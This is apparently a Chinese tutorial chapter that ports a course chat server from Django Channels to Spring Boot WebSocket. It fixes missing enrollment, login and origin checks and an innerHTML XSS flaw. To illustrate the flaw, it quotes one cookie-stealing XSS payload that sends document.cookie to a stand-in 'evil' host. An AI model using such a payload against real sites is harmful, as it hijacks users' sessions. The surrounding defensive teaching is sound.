聊天服务器

每门课程有一个聊天室，选了课的学生可以实时交流。实时推送需要 WebSocket：浏览器和服务器之间保持一条长连接，双方随时发消息。 Django 是同步的 WSGI 框架，书中为此引入了 Channels（换成 ASGI 服务器 Daphne、写异步消费者、用 Redis 通道层在进程间广播）。 Spring Boot 的内嵌 Tomcat 本来就支持 WebSocket，同一个端口、同一个进程，处理消息的代码也是普通的同步代码。 这一章的重点是：WebSocket 处理器的生命周期、用 Redis 发布/订阅实现“通道层”，以及书中遗漏的三个安全问题。

本章目标

  • 用 TextWebSocketHandler 实现聊天消费者；理解连接、消息、断开三个回调
  • 在握手阶段检查登录和选课（书中没有），并理解同源检查
  • 用 Redis 发布/订阅在多个应用实例之间广播消息（≈ channels_redis）
  • 保存聊天记录，页面打开时显示最近 5 条
  • 修复前端用 innerHTML 拼接消息导致的 XSS
  • 用真实的 WebSocket 客户端写集成测试

对应的 Django 讲解见 Django 版第 16 章；本章代码在 springboot/Chapter16/。

消费者 → WebSocketHandler

Django · consumers.py
class ChatConsumer(AsyncWebsocketConsumer):
    async def connect(self):
        self.user = self.scope['user']
        self.id = self.scope['url_route']['kwargs']['course_id']
        self.room_group_name = f'chat_{self.id}'
        await self.channel_layer.group_add(
            self.room_group_name, self.channel_name)
        await self.accept()

    async def disconnect(self, close_code):
        await self.channel_layer.group_discard(
            self.room_group_name, self.channel_name)

    async def receive(self, text_data):
        message = json.loads(text_data)['message']
        now = timezone.now()
        await self.channel_layer.group_send(
            self.room_group_name,
            {'type': 'chat_message', 'message': message,
             'user': self.user.username,
             'datetime': now.isoformat()})
        await self.persist_message(message)

    async def chat_message(self, event):
        await self.send(text_data=json.dumps(event))
Spring · ChatWebSocketHandler.java
@Component
public class ChatWebSocketHandler extends TextWebSocketHandler {

    @Override
    public void afterConnectionEstablished(WebSocketSession session) {
        rooms.join(courseId(session), session);          // group_add
    }

    @Override
    public void afterConnectionClosed(WebSocketSession session,
                                      CloseStatus status) {
        rooms.leave(courseId(session), session);         // group_discard
    }

    @Override
    protected void handleTextMessage(WebSocketSession session,
                                     TextMessage text) throws Exception {
        String message;
        try {
            message = json.readTree(text.getPayload())
                    .path("message").asString("");
        } catch (JacksonException e) {
            session.close(CloseStatus.BAD_DATA);         // 1007
            return;
        }
        if (message.isBlank() || message.length() > MAX_LENGTH) return;
        Message saved = chat.save(courseId(session), userId(session), message);
        rooms.publish(ChatEvent.chatMessage(courseId(session), message,
                username(session), saved.getSentOn())); // group_send
    }
}
  • 同步还是异步：Channels 的消费者是 async 的，访问数据库要用 acreate() 或 database_sync_to_async。Spring 在线程池的线程上调用处理器，直接调用普通的 JPA 服务即可。（Java 21 的虚拟线程让这种写法在高并发下也很便宜：spring.threads.virtual.enabled=true。）
  • 先保存再广播：书中先 group_send 再保存，实时消息的时间是 timezone.now()，数据库里是 auto_now_add 的时间，两者略有差别。这里先保存，广播的时间就是数据库里的时间，刷新页面后显示的一致。
  • 输入校验：非 JSON 直接关闭连接（1007 Bad Data）；空消息忽略；长度限制 2000（书中没有限制）。

握手：登录、选课、同源

WebSocket 连接以一个普通的 HTTP GET 请求开始（带 Upgrade: websocket 头），服务器回 101 才切换协议。 这个握手请求会经过 Spring Security 的过滤器链，所以会话 cookie 已经被认证过了。我们在 HandshakeInterceptor 里做业务检查： 

@Override
public boolean beforeHandshake(ServerHttpRequest request, ServerHttpResponse response,
                               WebSocketHandler wsHandler, Map<String, Object> attributes) {
    Matcher matcher = ROOM.matcher(request.getURI().getPath());       // /ws/chat/room/(\d+)/
    if (!matcher.matches()
            || !(request.getPrincipal() instanceof Authentication auth)
            || !(auth.getPrincipal() instanceof CurrentUser user)) {
        response.setStatusCode(HttpStatus.FORBIDDEN);
        return false;
    }
    long courseId = Long.parseLong(matcher.group(1));
    if (!chat.isEnrolled(courseId, user.id())) {                      // 书中没有这一步
        response.setStatusCode(HttpStatus.FORBIDDEN);
        return false;
    }
    // ≈ self.scope['user'] 和 self.scope['url_route']['kwargs']['course_id']
    attributes.put("courseId", courseId);
    attributes.put("userId", user.id());
    attributes.put("username", user.getUsername());
    return true;
}
⚠ 书中的三个安全问题
  1. 不检查选课：course_chat_room 视图检查了“是否选了这门课”，但 WebSocket 的 connect() 什么都不检查就 accept()。任何登录用户改一下地址里的课程 id，就能进入任何聊天室、读到所有消息、以自己的名义发言。
  2. 不检查登录：匿名用户也能连上，self.user 是 AnonymousUser，发消息时保存到数据库失败。这里在 URL 规则里要求 /ws/** 登录，未登录的握手直接返回 401。
  3. 不检查来源：浏览器发起 WebSocket 连接时会带上 cookie，但不受同源策略限制。书中没有用 Channels 的 AllowedHostsOriginValidator，恶意网站的页面可以用访客的登录状态连上聊天室（跨站 WebSocket 劫持）。Spring 注册处理器时如果不调用 setAllowedOrigins(...)，默认只接受同源请求（检查 Origin 头），这个问题自动避免了。

未登录时为什么返回 401 而不是重定向？网页请求被重定向到登录页是合理的，但 WebSocket 客户端不会跟随重定向去登录。 在 Security 配置里给 /ws/** 单独指定一个入口点： 

.exceptionHandling(ex -> ex
        .defaultAuthenticationEntryPointFor(new HttpStatusEntryPoint(HttpStatus.UNAUTHORIZED),
                PathPatternRequestMatcher.withDefaults().matcher("/ws/**"))
        .defaultAuthenticationEntryPointFor(new LoginUrlAuthenticationEntryPoint("/accounts/login/"),
                AnyRequestMatcher.INSTANCE))

注意第二行不能省：一旦注册了任何“默认入口点”，表单登录自带的入口点就只对浏览器发的 HTML 请求生效了（它按 Accept 头匹配）， 其他请求会落到第一个注册的入口点上 —— 第一版漏了这一行，测试里所有“未登录重定向到登录页”的断言都变成了 401。

通道层：房间 + Redis 发布/订阅

Channels 的通道层做两件事：记录每个组（房间）里有哪些连接；把 group_send 的消息送到这些连接 —— 即使它们在别的进程里。 前者用一个并发 Map 就能实现；后者用 Redis 的发布/订阅：每个应用实例订阅 chat:room:*，发消息时发布到 chat:room:<课程 id>。 

@Component
public class ChatRooms implements MessageListener {

    /** 课程 id → (会话 id → 会话) */
    private final Map<Long, Map<String, WebSocketSession>> rooms = new ConcurrentHashMap<>();

    public void join(long courseId, WebSocketSession session) {
        // sendMessage 不是线程安全的：包一层，串行发送，并限制发送超时（5 秒）和缓冲（64 KB）
        rooms.computeIfAbsent(courseId, id -> new ConcurrentHashMap<>())
             .put(session.getId(), new ConcurrentWebSocketSessionDecorator(session, 5_000, 64 * 1024));
    }

    public void publish(ChatEvent event) {
        redis.convertAndSend("chat:room:" + event.courseId(), json.writeValueAsString(event));
    }

    /** Redis 订阅回调 ≈ consumer.chat_message(event)：原样推给本机房间里的连接 */
    @Override
    public void onMessage(org.springframework.data.redis.connection.Message message, byte[] pattern) {
        long courseId = ...;   // 从频道名解析
        TextMessage text = new TextMessage(new String(message.getBody(), UTF_8));
        rooms.getOrDefault(courseId, Map.of()).values().forEach(s -> s.sendMessage(text));
    }
}

// ChatConfig
@Bean
RedisMessageListenerContainer chatListenerContainer(RedisConnectionFactory cf, ChatRooms rooms) {
    RedisMessageListenerContainer container = new RedisMessageListenerContainer();
    container.setConnectionFactory(cf);
    container.addMessageListener(rooms, new PatternTopic("chat:room:*"));
    return container;
}
  • 为什么要包 ConcurrentWebSocketSessionDecorator：两个学生同时发言，两个线程会同时向同一个连接写数据，底层的 WebSocket 实现会抛 IllegalStateException。装饰器把发送排成队；某个客户端网络很慢时，超过时间或缓冲上限就断开它，而不是拖住发送线程。
  • 只部署一个实例时，Redis 看起来是多余的（直接遍历本机的连接就行）。但写成发布/订阅之后，扩容到多个实例时代码一行不用改 —— 这正是书中配置 channels_redis 的原因。
  • Redis 的发布/订阅不持久化：没有订阅者时消息就丢了。这对聊天室没问题（消息已经存进数据库）；需要可靠投递时应该用 Redis Streams 或消息队列。

Spring · MessageRepository + ChatService
@EntityGraph(attributePaths = "user")
List<Message> findByCourseIdOrderByIdDesc(Long courseId, Limit limit);

public List<Message> latestMessages(Long courseId) {
    return messages.findByCourseIdOrderByIdDesc(courseId, Limit.of(5))
            .reversed();          // Java 21 的 SequencedCollection
}

Limit.of(5) 是 Spring Data 3.2 起的写法（≈ 切片 [:5]）；List.reversed() 是 Java 21 新增的，和 Python 的 reversed() 一样返回反向视图。 消息表的外键用 on_delete=PROTECT 的语义：迁移脚本里外键不带 ON DELETE CASCADE，有聊天记录的用户和课程不能被直接删除。

书中把别人发来的消息直接拼进 HTML：任何学生发一条 <img src=x onerror="fetch('https://evil/?c='+document.cookie)">， 房间里所有人的浏览器都会执行这段脚本。服务端模板里的历史消息由 Django 自动转义，所以只有实时消息有问题 —— 很容易在测试时漏掉。 改为逐个创建元素，用户输入只通过 textContent / append(字符串) 写入，浏览器永远把它当作纯文本。

  • 页面变量：书中用 json_script 过滤器把课程 id 和用户名安全地放进页面；Thymeleaf 的 JavaScript 内联模式做同样的事：const requestUser = /*[[${#authentication.name}]]*/ 'user'; 会输出正确转义的 JS 字符串字面量。
  • 协议：书中写死了 'ws://'（第 17 章改成 'wss://'）；这里按页面协议选择，开发和生产用同一份模板。

测试

Channels 提供 WebsocketCommunicator 在进程内测试消费者。Spring 这边最可靠的做法是启动真正的服务器（随机端口）， 先用 HttpClient 走一遍表单登录拿到会话 cookie，再用 StandardWebSocketClient 带着 cookie 连接： 

@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class ChatWebSocketTests {

    @Test
    void messagesAreBroadcastToEveryoneInTheRoomAndPersisted() throws Exception {
        Client alice = connect(login("ws-alice"), base("http"));
        Client bob = connect(login("ws-bob"), null);
        await().atMost(Duration.ofSeconds(5)).until(() -> rooms.size(course.getId()) == 2);

        alice.session().sendMessage(new TextMessage("{\"message\": \"<b>hi</b> bob\"}"));

        for (Client client : new Client[] {alice, bob}) {
            JsonNode event = json.readTree(client.inbox().poll(5, TimeUnit.SECONDS));
            assertThat(event.get("message").asString()).isEqualTo("<b>hi</b> bob");   // 原样传递
            assertThat(event.get("user").asString()).isEqualTo("ws-alice");
        }
        assertThat(messages.findAll()).extracting(Message::getContent).containsExactly("<b>hi</b> bob");
    }

    @Test
    void handshakeIsRejectedForStrangersAnonymousUsersAndForeignOrigins() throws Exception {
        assertThatThrownBy(() -> connect(login("ws-carol"), null)).hasStackTraceContaining("403");  // 没选课
        assertThatThrownBy(() -> connect(null, null)).hasStackTraceContaining("401");               // 未登录
        assertThatThrownBy(() -> connect(login("ws-alice"), "http://evil.example"))
                .hasStackTraceContaining("403");                                                  // 跨站
    }
}

差异点评

🔍 第 16 章 Spring 版点评 springboot/Chapter16

做得好 握手阶段完成全部授权检查

登录、选课、同源三项检查都在连接建立之前完成，被拒绝的连接根本不会进入房间；测试覆盖了每一种拒绝。

做得好 修复了实时消息的 XSS

服务端存的、传的都是原始文本，只在显示时作为文本插入 DOM —— “输出时按上下文转义”是防 XSS 的根本原则。

注意 退课后连接仍然有效

检查只发生在握手时。学生退课（或被删除）后，已经建立的连接还能继续收发消息，直到断开。要严格控制，可以在 handleTextMessage 里再检查一次，或者退课时主动关闭该用户的连接。

注意 会话过期不影响 WebSocket

WebSocket 连接建立后不再发送 HTTP 请求，HTTP 会话可能在聊天过程中过期，而连接仍然保持认证状态。这在大多数聊天场景可以接受；Spring Session 提供了在 WebSocket 消息时刷新会话的支持。

补充知识 什么时候该用 STOMP

需要“订阅多个主题”“给某个用户单独推送”“消息确认”，或者想接入 RabbitMQ 这类外部消息代理时，STOMP + @MessageMapping 能省很多代码；前端要配合使用 stomp.js。

小结

  • Spring Boot 不需要换服务器：@EnableWebSocket + TextWebSocketHandler，处理代码是普通的同步代码。
  • 握手是 HTTP 请求：Security 先认证，HandshakeInterceptor 再做业务授权；默认只允许同源。
  • 通道层 = 本机房间表 + Redis 发布/订阅；向连接发送要用并发安全的装饰器。
  • 先保存再广播；前端用 textContent 显示用户输入。
  • 用真实服务器 + WebSocket 客户端做集成测试，用 Awaitility 等待异步结果。
